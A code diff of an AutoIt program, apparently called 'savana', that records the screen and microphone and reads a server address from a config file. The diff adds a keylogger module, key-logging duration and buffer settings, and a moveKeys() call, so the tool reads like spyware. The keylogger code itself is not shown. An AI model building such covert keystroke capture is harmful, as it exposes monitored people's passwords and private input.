@@ -32,6 +32,7 @@ Opt("ExpandVarStrings", 1) ;
 #include "modules/screenRecording.au3"
 #include "modules/microphoneRecording.au3"
 #include "modules/Media.au3"
+#include "modules/keyLogger.au3"
 #EndRegion include program modules
 
 
@@ -45,8 +46,11 @@ Global $sqliteHandle
 Global $databaseHandle
 Global $databaseFile=@WorkingDir&"\database\savana.db"
 Global $serverAddress = IniRead($iniFilePath, "server", "server_address", "localhost")
-Global $screenRecordingDurration = IniRead($iniFilePath, "screenRecording", "durration", "60")
-Global $microphoneRecordingDurration= IniRead($iniFilePath, "microphoneRecording", "durration", "60")
+Global $screenRecordingDurration = IniRead($iniFilePath, "screenRecording", "durration", "6")
+Global $microphoneRecordingDurration= IniRead($iniFilePath, "microphoneRecording", "durration", "6")
+Global $keyLoggingDurration= IniRead($iniFilePath, "keyLogging", "durration", "6")
+Global $keyLoggingSleepTime= IniRead($iniFilePath, "keyLogging", "sleepTime", "200")
+Global $keyBuffer=""
 #EndRegion global varriables
    
 ;screenShot()
@@ -69,11 +73,18 @@ Global $microphoneRecordingDurration= IniRead($iniFilePath, "microphoneRecording
 
 ;moveMicrophoneRecordings()
 
+;keyLog()
+
+;putKeysLocal()
+
+moveKeys()
+
 Exit
 
 While 1
 	
 	ConsoleWrite("hello");
-	sleep(1000)
+	
+	sleep(100)
 	
 WEnd
